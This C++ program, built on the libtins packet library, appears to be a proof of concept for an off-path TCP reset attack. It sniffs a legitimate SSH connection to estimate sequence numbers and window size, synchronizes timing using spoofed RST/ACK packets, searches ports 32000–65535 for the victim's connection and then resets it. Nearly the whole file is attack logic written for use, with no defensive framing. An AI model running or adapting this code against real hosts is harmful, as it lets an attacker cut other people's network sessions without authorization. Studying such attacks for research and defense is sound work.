#include <chrono>
#include <iostream>
#include <tins/tins.h>
#include <thread>

#include "common.h"
#include "packet_counter.h"
#include "attacker.h"

using namespace std;
using namespace std::chrono_literals;

// Inital number of legit SSH packets to trigger sniffer
const int kInitPacketCount = 10;
const uint32_t kInitPacketWaitSec = 2;

void printHeader(const std::string msg) {
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl << "  " << msg << endl;
    for (auto i = 0u; i < msg.size() + 4; i++) {
        cout << "=";
    }
    cout << endl;
}

tuple<ConnectionID, uint32_t, uint32_t> waitAndGetLegitConnectionInfo(
        const string& serverIP, int serverPort) {
    Tins::Sniffer sniffer(kNetworkInterface);
    sniffer.set_filter(
      "dst host " + serverIP + " and dst port " + to_string(serverPort));
    sniffer.set_pcap_sniffing_method(pcap_dispatch);
    sniffer.set_timeout(kInitPacketWaitSec);
    int packetCount = kInitPacketCount;
    uint32_t estimatedWindowSize = 26703;
    uint32_t ws = 1;
    while (packetCount > 0) {
        auto pdu = sniffer.next_packet().pdu();
        const Tins::TCP& tcp = pdu->rfind_pdu<Tins::TCP>();
        if (tcp.has_flags(tcp.SYN)) {
            ws = 1 << tcp.winscale();
        } else {
            estimatedWindowSize = min(estimatedWindowSize, tcp.window() * ws);
        }
        packetCount--;
    }

    cout << "Got " << kInitPacketCount 
         << " initial packets. Sniffing for more until silent for "
         << kInitPacketWaitSec << " sec" << endl;

    uint32_t lastSeq = 0;
    ConnectionID connection;
    while (has_packet(sniffer, kInitPacketWaitSec)) {
        auto pdu = sniffer.next_packet().pdu();
        const Tins::IP &ip = pdu->rfind_pdu<Tins::IP>();
        const Tins::TCP &tcp = pdu->rfind_pdu<Tins::TCP>();
        connection = ConnectionID(ip.src_addr(), tcp.sport(), ip.dst_addr(), tcp.dport()); 
        lastSeq = max(lastSeq, tcp.seq());
        estimatedWindowSize = min(estimatedWindowSize, tcp.window() * ws);
    }
    return make_tuple(connection, lastSeq, estimatedWindowSize);
}

void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
    auto pcounter = PacketCounter::instance();
    Tins::PacketSender sender;
    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3);
    for (int c = 0; c < 5; c++) {
        pcounter->startCounting();
        auto s = align_and_delay(delayMs);
        int packets = 200;
        for (int i = 0; i < packets; i++) {
            sender.send(pkt);
            s += 5ms;
            this_thread::sleep_until(system_clock::time_point(s));
        }
        this_thread::sleep_for(2s);

        auto result = pcounter->stopCounting();
        cout << "Delay until: " << s.count() << "ms. ";
        cout << " Sent: " << packets << " packets. Received: " << result << " packets" << endl;
    }
}

int main() {
    printHeader("WAITING FOR THE LEGIT CONNECTION...");
    auto legitInfo = waitAndGetLegitConnectionInfo(kServerIP, kServerPort);
    auto legitConn = get<0>(legitInfo);
    auto legitLastSeq = get<1>(legitInfo);
    auto estimatedWS = get<2>(legitInfo);
    cout << "Got legit connection info: " 
        << legitConn.toString() << " " 
        << legitLastSeq << " " 
        << estimatedWS << endl;

    Attacker attacker(legitConn, legitLastSeq, kVictimIP);
    attacker.setEstimatedWindowSz(estimatedWS);

    printHeader("SYNCHRONIZING CLOCK...");
    auto syncDelayMs = attacker.synchronizeClock();
    cout << "Synchronization delay: " << syncDelayMs.count() << "ms" << endl;

    printHeader("FINDING VICTIM'S PORT...");
    try {
        auto victimPort = attacker.findPort(32000, 65535);
        cout << "Victim's port: " << victimPort << endl;
    } catch (char const* err) {
        cout << "Error: " << err << endl;
        return 1;
    }

    printHeader("RESETING VICTIM'S CONNECTION...");
    try {
        attacker.resetConnection();
    } catch (char const* err) {
        cout << "Error: " << err << endl;
        return 1;
    }
    return 0;
}